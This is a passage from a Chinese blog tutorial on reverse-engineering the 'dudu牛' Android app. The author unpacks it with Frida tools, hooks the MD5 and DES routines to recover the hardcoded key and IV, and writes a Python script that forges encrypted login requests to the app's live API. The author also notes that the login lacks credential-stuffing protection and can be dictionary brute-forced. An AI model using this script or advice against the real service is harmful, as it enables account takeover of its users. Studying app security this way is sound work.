<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>App逆向案例-dudu牛</title>
    <url>/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/</url>
    <content><![CDATA[<h1 id="App逆向案例-dudu牛"><a href="#App逆向案例-dudu牛" class="headerlink" title="App逆向案例-dudu牛"></a>App逆向案例-dudu牛</h1><p>在模拟器中安装该app后，首先运行app熟悉页面及其功能，下图为登录页面</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805205630380.png" class title="image-20230805205630380">

<h2 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h2><h3 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>我们先使用Charles对该app抓取http请求数据包</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805205944464.png" class title="image-20230805205944464">

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805210051600.png" class title="image-20230805210051600">

<p>可以看到该登录接口请求包中的”Encrypt”参数和相应包都是进行了加密处理，多次更改登录信息发现参数变化，我们来分析下该接口的加密处理。</p>
<h3 id="脱壳处理"><a href="#脱壳处理" class="headerlink" title="脱壳处理"></a>脱壳处理</h3><p>我们使用jadx工具对该apk包进行反编译分析，可以看到该包做了混淆处理，无法有效阅读代码，并且里面的”qihoo.util”可以初步判断使用的360加固</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805210921059.png" class title="image-20230805210921059">

<p>我们也可以使用查壳工具来判断出使用的360加固</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805211043033.png" class title="image-20230805211043033">



<p>接下来我们就需要去对其进行脱壳处理得到原代码，这里使用frida-dexdump搭配frida进行脱壳。首先启动安装在模拟器上的frida server</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805213013676.png" class title="image-20230805213013676">



<p>然后在命令行窗口上使用frida-dexdum得到程序脱壳后的dex文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida-dexdump -FU</span><br></pre></td></tr></table></figure>

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805215250546.png" class title="image-20230805215250546">

<p>可以看到嘟嘟牛在线有四个dex文件，这些为脱壳后的dex文件</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805215443609.png" class title="image-20230805215443609">



<p>同样使用BlackDex32在模拟器上对嘟嘟牛在线进行脱壳处理得到脱壳后文件</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805223957452.png" class title="image-20230805223957452">

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230805224239726.png" class title="image-20230805224239726">



<h3 id="反编译分析"><a href="#反编译分析" class="headerlink" title="反编译分析"></a>反编译分析</h3><p>我们使用jadx-gui对脱壳后的dex文件进行反编译，如下图所示</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806163959325.png" class title="image-20230806163959325">



<p>搜索文本”Encrypt”作为关键字字符串进行查询，由于该字符串是在登录接口http报文中涵盖的字符串，所以可以判断出源代码位于com.dodonew.online.http.JsonRequest类中存在addRequestMap方法中有该字符串</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806164406705.png" class title="image-20230806164406705">



<p>跟进该函数进一步分析逻辑关系</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806165022759.png" class title="image-20230806165022759">



<p>该函数中值得注意的是定义了一个encrypt字符串变量，这就是生成的Encrypt字符串，入口点定位正确</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String time = System.currentTimeMillis() + DeviceConfig.f7371b;</span><br><span class="line">        <span class="keyword">if</span> (addMap == <span class="keyword">null</span>) &#123;</span><br><span class="line">            addMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        &#125;</span><br><span class="line">        addMap.put(<span class="string">&quot;timeStamp&quot;</span>, time);</span><br><span class="line">String encrypt = RequestUtil.encodeDesMap(RequestUtil.paraMap(addMap, Config.BASE_APPEND, <span class="string">&quot;sign&quot;</span>), <span class="keyword">this</span>.desKey, <span class="keyword">this</span>.desIV);</span><br><span class="line">        JSONObject obj = <span class="keyword">new</span> JSONObject();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先获取系统时间戳，将其添加进addmap中，随后调用RequestUtil.paraMap将addMap和Config.BASE_APPEND作为参数。可以看到BASE_APPEND为一固定值字符串 “sdlkjsdljf0j2fsjk”</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806170631248.png" class title="image-20230806170631248">



<p>我们跟进RequestUtil.paraMap函数进一步分析</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806171558085.png" class title="image-20230806171558085">

<p>该函数先将addMap中的键提取出来，然后定义一个List集合用来存放键值信息，使用sort()对该list进行排序。将排序后的键值按序保存在builder中，最后添加 “sdlkjsdljf0j2fsjk”这一字符串，对builder进行计算md5值保存在sign这一字符串中。</p>
<h3 id="还原加密"><a href="#还原加密" class="headerlink" title="还原加密"></a>还原加密</h3><p>上面初步分析了对字符串计算md5值，接下来我们来分析判断对哪些值进行md5计算。 </p>
<p>下面编写一个Frida脚本记录java类的操作，获取com.dodonew.online.util.utils类的对象，然后返回其计算md5值后的字符串信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line"></span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line"></span><br><span class="line">        var Utils = Java.use(&quot;com.dodonew.online.util.Utils&quot;);</span><br><span class="line"></span><br><span class="line">        Utils[&quot;md5&quot;].implementation = function (string) &#123;</span><br><span class="line"></span><br><span class="line">            console.log(&#x27;md5 is called&#x27; + &#x27;, &#x27; + &#x27;string: &#x27; + string);</span><br><span class="line"></span><br><span class="line">            var ret = this.md5(string);</span><br><span class="line"></span><br><span class="line">            console.log(&#x27;md5 ret value is &#x27; + ret);</span><br><span class="line"></span><br><span class="line">            return ret;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>



<p>将其保存为test.js文件，使用frida命令运行启动脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -l test.js -f com.dodonew.online</span><br></pre></td></tr></table></figure>

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806182031706.png" class title="image-20230806182031706">



<p>等程序运行后，输入手机号码和密码信息点击登录，可看到脚本中返回需要计算md5的参数和计算后的md5值</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806181855554.png" class title="image-20230806181855554">

<p>返回信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SM-G988N::com.dodonew.online ]-&gt; md5 is called, string: equtype=ANDROID&amp;loginImei=Android351564715931416&amp;timeStamp=1691317099396&amp;userPwd=12345&amp;username=18148411953&amp;key=sdlkjsdljf0j2fsjk</span><br><span class="line"></span><br><span class="line">md5 ret value is </span><br><span class="line">7b9841d0d0c5d23c9271200e9f950b32</span><br></pre></td></tr></table></figure>



<p>我们使用在线工具计算字符串md5值正确，对照一致，符合标准md5值算法</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806183100004.png" class title="image-20230806183100004">



<p>我们继续来看下面的代码，encodeDesMap函数还有this.deskey和this.desIVl两个参数，猜测使用了des算法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String encrypt = RequestUtil.encodeDesMap(RequestUtil.paraMap(addMap, Config.BASE_APPEND, &quot;sign&quot;), this.desKey, this.desIV);</span><br></pre></td></tr></table></figure>

<p>跟进该函数，先调用了DesSecurity函数对deskey和desIV进行操作,再调用了encrypt64函数对加密的数据进行Base64编码</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806212318940.png" class title="image-20230806212318940">

<p>跟进DesSecurity函数，调用InitCipher函数对deskey和desIV进行操作</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806213303747.png" class title="image-20230806213303747">

<p>InitCipher函数中首先对deskey进行md5加密，然后传进去进行DES加密，使用的加密模式是CBC填充方式PKCS5Padding</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806213435064.png" class title="image-20230806213435064">



<p>我们先找出deskey和desIV参数，下面代码为hook代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line"></span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line"></span><br><span class="line">        var RequestUtil = Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);</span><br><span class="line"></span><br><span class="line">        RequestUtil[&quot;encodeDesMap&quot;].overload(&#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;, &#x27;java.lang.String&#x27;).implementation = function (data, desKey, desIV) &#123;</span><br><span class="line"></span><br><span class="line">            console.log(&#x27;encodeDesMap is called&#x27; + &#x27;, &#x27; + &#x27;data: &#x27; + data + &#x27;, &#x27; + &#x27;desKey: &#x27; + desKey + &#x27;, &#x27; + &#x27;desIV: &#x27; + desIV);</span><br><span class="line"></span><br><span class="line">            var ret = this.encodeDesMap(data, desKey, desIV);</span><br><span class="line"></span><br><span class="line">            console.log(&#x27;encodeDesMap ret value is &#x27; + ret);</span><br><span class="line"></span><br><span class="line">            return ret;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>

<p>使用frida运行该脚本得到deskey和desiv这两个值65102933和32028092</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> encodeDesMap is called, data: &#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android351564715931416&quot;,&quot;sign&quot;:&quot;4AC813019A9C77EF6498B3221DCCC17F&quot;,&quot;timeStamp&quot;:&quot;1691322190860&quot;,&quot;userPwd&quot;:&quot;12345&quot;,&quot;username&quot;:&quot;18200411953&quot;&#125;, desKey: 65102933, desIV: 32028092</span><br><span class="line"> </span><br><span class="line">encodeDesMap ret value is NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii7mUQQsI1NkwwCI4HVgshTMq</span><br><span class="line">i6557JDHstrEdSW11iu/vvUpskEuxayIZPFIFNCu4Botd21NW6//bTU+cPCqMHADoYHmZWF4QshO</span><br><span class="line">SBlYcRIP9PkfH1EZE0gjBqIGmjhZrzr1C7RPND6PYF8q2udN4T9bznMt6Qn9mAf719HDgepvcBCm</span><br><span class="line">m09qHaE=</span><br></pre></td></tr></table></figure>

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806220303535.png" class title="image-20230806220303535">



<p>了解了整个加密过程，我们编写程序来还原下加密代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> CBC, PAD_PKCS5, des</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5_mes</span>(<span class="params">mes</span>):</span></span><br><span class="line"></span><br><span class="line">    new_md5 = md5()</span><br><span class="line"></span><br><span class="line">    new_md5.update(mes.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt</span>(<span class="params">data, desKey, desIV</span>):</span></span><br><span class="line"></span><br><span class="line">    key = desKey[:<span class="number">8</span>]  </span><br><span class="line"></span><br><span class="line">    ds = des(key, CBC, desIV, pad=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    en = ds.encrypt(data.encode(), padmode = PAD_PKCS5)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(en).decode()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    desIV = <span class="string">&#x27;32028092&#x27;</span></span><br><span class="line"></span><br><span class="line">    desKey = <span class="built_in">bytes</span>.fromhex(get_md5_mes(<span class="string">&#x27;65102933&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Android351564715931416&quot;,&quot;sign&quot;:&quot;4AC813019A9C77EF6498B3221DCCC17F&quot;,&quot;timeStamp&quot;:&quot;1691322190860&quot;,&quot;userPwd&quot;:&quot;12345&quot;,&quot;username&quot;:&quot;18200411953&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(des_encrypt(data, desKey, desIV))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230806222914273.png" class title="image-20230806222914273">

<p>可以看到得出的结果刚好符合，还原成功。</p>
<h3 id="模拟请求"><a href="#模拟请求" class="headerlink" title="模拟请求"></a>模拟请求</h3><p>我们来梳理下整个加密流程</p>
<ul>
<li>首先使用md5计算请求签名(equtype、loginImei、timeStamp、userPwd、username、key)保存为sign</li>
<li>对签名及其他字符串进行des加密</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取deskey前8字节作为加密密钥</span><br><span class="line">取desIV使用CBC模式PAD_PKCS5进行加密</span><br><span class="line">将机密后的字符串进行Base64编码</span><br></pre></td></tr></table></figure>



<p>编写的模拟请求如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> CBC, PAD_PKCS5, des</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5_mes</span>(<span class="params">mes</span>):</span><span class="comment">#获取字符串的md5值</span></span><br><span class="line"></span><br><span class="line">    new_md5 = md5()</span><br><span class="line"></span><br><span class="line">    new_md5.update(mes.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> new_md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_encrypt</span>(<span class="params">data, desKey, desIV</span>):</span><span class="comment">#DES加密</span></span><br><span class="line"></span><br><span class="line">    key = desKey[:<span class="number">8</span>]  </span><br><span class="line"></span><br><span class="line">    ds = des(key, CBC, desIV, pad=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    en = ds.encrypt(data.encode(), padmode=PAD_PKCS5)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(en).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_timeStamp</span>():</span><span class="comment">#获取时间戳</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sign</span>():</span><span class="comment">#获取请求签名</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&#x27;equtype=ANDROID&amp;loginImei=Androidnull&amp;timeStamp=&#x27;</span> + timeStamp + <span class="string">&#x27;&amp;userPwd=admin&amp;username=18148411953&amp;key=sdlkjsdljf0j2fsjk&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> get_md5_mes(s).upper()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Encrypt</span>():</span><span class="comment">#获取加密后的请求参数</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&#x27;&#123;&quot;equtype&quot;:&quot;ANDROID&quot;,&quot;loginImei&quot;:&quot;Androidnull&quot;,&quot;sign&quot;:&quot;&#x27;</span> + get_sign() + <span class="string">&#x27;&quot;,&quot;timeStamp&quot;:&quot;&#x27;</span> + timeStamp + <span class="string">&#x27;&quot;,&quot;userPwd&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;18148411953&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> des_encrypt(s, desKey, desIV)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span><span class="comment">#构造http request请求</span></span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://api.dodovip.com/api/user/login&quot;</span></span><br><span class="line"></span><br><span class="line">    header = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;api.dodovip.com&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;public, max-age=0&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json; charset=utf-8&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Dalvik/2.1.0 (Linux; U; Android 11; M2012K11AC Build/RQ3A.211001.001)&quot;</span>,</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;Encrypt&#x27;</span>: get_Encrypt()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, headers=header, json=data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    desIV = <span class="string">&#x27;32028092&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 需转换成 byte 的 hex 值 用 hexstr 来创建 bytes 对象</span></span><br><span class="line"></span><br><span class="line">    desKey = <span class="built_in">bytes</span>.fromhex(get_md5_mes(<span class="string">&#x27;65102933&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    timeStamp = get_timeStamp()</span><br><span class="line"></span><br><span class="line">    login()</span><br></pre></td></tr></table></figure>

<p>可以看到模拟请求的响应报文和app登录接口响应报文中内容一样</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230807105319038.png" class title="image-20230807105319038">

<p>返回数据还是加密的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2v+DC2gq7RuAC8PE5GZz5wH3/y9ZVcWhFwhDY9L19g9iEd075+Q7xwewvfIN0g0ec/NaaF43/S0=</span><br></pre></td></tr></table></figure>



<p>DES算法是对称加密算法，可以在JsonRequest类中可以看到有个response方法</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230807110119362.png" class title="image-20230807110119362">

<p>注意下面这行代码，其中用到了this.deskey和this.desIV这两个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str = RequestUtil.decodeDesJson(str, this.desKey, this.desIV);</span><br></pre></td></tr></table></figure>



<p>下面我们来具体看看decodeDesJson方法用到的数据，使用frida编写简单的hook代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line"></span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line"></span><br><span class="line">        var RequestUtil = Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);</span><br><span class="line"></span><br><span class="line">        RequestUtil[&quot;decodeDesJson&quot;].implementation = function (json, desKey, desIV) &#123;</span><br><span class="line"></span><br><span class="line">            console.log(&#x27;decodeDesJson is called&#x27; + &#x27;, &#x27; + &#x27;json: &#x27; + json + &#x27;, &#x27; + &#x27;desKey: &#x27; + desKey + &#x27;, &#x27; + &#x27;desIV: &#x27; + desIV);</span><br><span class="line"></span><br><span class="line">            var ret = this.decodeDesJson(json, desKey, desIV);</span><br><span class="line"></span><br><span class="line">            console.log(&#x27;decodeDesJson ret value is &#x27; + ret);</span><br><span class="line"></span><br><span class="line">            return ret;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>

<p>运行该脚本，在登录接口中输入手机号码和密码点击登录，可以看到返回的加密信息和解密后的JSON字符串</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230807111708447.png" class title="image-20230807111708447">

<p>返回信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;code&quot;:-1,&quot;message&quot;:&quot;账号或密码错误&quot;,&quot;data&quot;:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>至此将该app登录接口模拟请求成功，由于该接口未做防撞库，可使用字典对手机号和密码进行爆破</p>
<h2 id="注册接口"><a href="#注册接口" class="headerlink" title="注册接口"></a>注册接口</h2><p>注册界面如下，有手机号码、登录密码和验证码三个输入参数</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230808163005564.png" class title="image-20230808163005564">

<h3 id="抓包分析-1"><a href="#抓包分析-1" class="headerlink" title="抓包分析"></a>抓包分析</h3><p>我们先使用Charles对该app抓取获取验证码http请求数据包，这里使用的测试用例为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">电话号码：18148411953</span><br><span class="line">登录密码：admin</span><br></pre></td></tr></table></figure>

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230808164440532.png" class title="image-20230808164440532">

<p>抓取的请求和响应报文如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/user/regCode HTTP/1.1</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G988N Build/NRD90M)</span><br><span class="line">Host: api.dodovip.com</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 151</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;Encrypt&quot;:&quot;VcoXz6dO\/thZ4\/m4PTyZPX+0J3iLNxRy+URRTGi9\/LI0AUSg\/R6SaZXENfK9uOm8nXrss2dC5Nbi\neItA\/j2wmRE33fd4nCDaFtCJ3Wda8vxfwA8AuGaqLkCt5dJ3bQhU\n&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">respond:</span><br><span class="line">2v+DC2gq7Rs5bcSNXbyEx5NU077kz30XWVKcFfbDbqfwNfIfy/H7WfFaOoMFRieB4vJKmUSdrviL</span><br><span class="line">ucFs2ZbC+89cZLVR2q86OhBJqXwkedVPzhVeu2r3xpKnonbCMovs</span><br></pre></td></tr></table></figure>



<p>下面为注册时的http请求及其响应报文，测试用例为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">电话号码：18148411953</span><br><span class="line">登录密码：admin</span><br><span class="line">验证码：123456</span><br></pre></td></tr></table></figure>

<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230808165018471.png" class title="image-20230808165018471">

<p>抓取的请求和响应报文如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/user/activateAccount HTTP/1.1</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G988N Build/NRD90M)</span><br><span class="line">Host: api.dodovip.com</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Content-Length: 285</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\/\/FDsRnlBfgL4lcVxjXii7mUQQsI1NkwwCI4HVgshTOW\nqpHE8q4N8iEDukVF0C9p4xJVE7Km+zijcNlqK038YX5CRUp5A8oy+UVl7otgB3TAD65sXwkMhCwS\nwY0iPkIY7Cr\/lMsVHISUXF6xAPs+xApDcTW804\/ICXm\/gfrzyecRtMgjtowLUWI6I2Nll12kOQdw\n4dO6FM1wbqY2T72Z\/wh\/4e653Twn\n&quot;&#125;</span><br><span class="line"></span><br><span class="line">respond:</span><br><span class="line">2v+DC2gq7RsNlVI9b1yN862HwQjTZO7NoQVzr8hRlcBfVp8rq9IPMznCRmxEVw9jsS/SHTe8nzCD</span><br><span class="line">gX+C9o0F2w==</span><br></pre></td></tr></table></figure>

<h3 id="反编译分析-1"><a href="#反编译分析-1" class="headerlink" title="反编译分析"></a>反编译分析</h3><p>在jadx中搜索关键字符串”activateAccount”,可查询到RegisterActivity类的register函数</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811112444453.png" class title="image-20230811112444453">

<p>值得注意的是onClick这个函数，这个函数使用switch分支来判断获取的按钮id来执行相应的逻辑，btn_get_code按钮为获取验证码，btn_register按钮为注册账号，btn_found_pwd为忘记密码</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811113323987.png" class title="image-20230811113323987">



<p>首先来看获取验证码btn_get_code这个分支代码，先使用checkMobile函数检查电话号是否符合要求，若符合则调用getCode函数向指定电话发送验证码信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">case C0689R.C0688id.btn_get_code /*2131558565*/:</span><br><span class="line">                String mobile = this.etMobile.getText() + DeviceConfig.f7371b.trim();</span><br><span class="line">                if (checkMobile(mobile)) &#123;</span><br><span class="line">                    getCode(mobile);</span><br><span class="line">                    return;</span><br><span class="line">1</span><br><span class="line">                &#125;</span><br><span class="line">                return;</span><br></pre></td></tr></table></figure>



<p>注册功能btn_register代码中通过checkInput函数判断用户输入的phone、pwd、code这三个参数，若都符合则调用register函数进行注册</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">case C0689R.C0688id.btn_register /*2131558653*/:</span><br><span class="line">                String phone = this.etMobile.getText() + DeviceConfig.f7371b.trim();</span><br><span class="line">                String pwd = this.etPwd.getText() + DeviceConfig.f7371b.trim();</span><br><span class="line">                String code = this.etCode.getText() + DeviceConfig.f7371b.trim();</span><br><span class="line">                if (checkInput(phone, pwd, code)) &#123;</span><br><span class="line">                    register(phone, pwd, code);</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                return;</span><br></pre></td></tr></table></figure>



<p>我们跟进checkInput函数，首先依次检查电话号码、密码和验证码是否为空，若为空则提示错误</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811130347602.png" class title="image-20230811130347602">

<p>继续跟进register函数，构造para参数属性(moblie、pwd、code、config.equtype、application.devid)，然后调用requestNetwork函数通过”user&#x2F;activateAccount”路由接口进行请求。</p>
<img src="/2023/03/12/App%E9%80%86%E5%90%91%E6%A1%88%E4%BE%8B-dudu%E7%89%9B/image-20230811130737871.png" class title="image-20230811130737871">

<p>继续跟进requestNetwork函数</p>
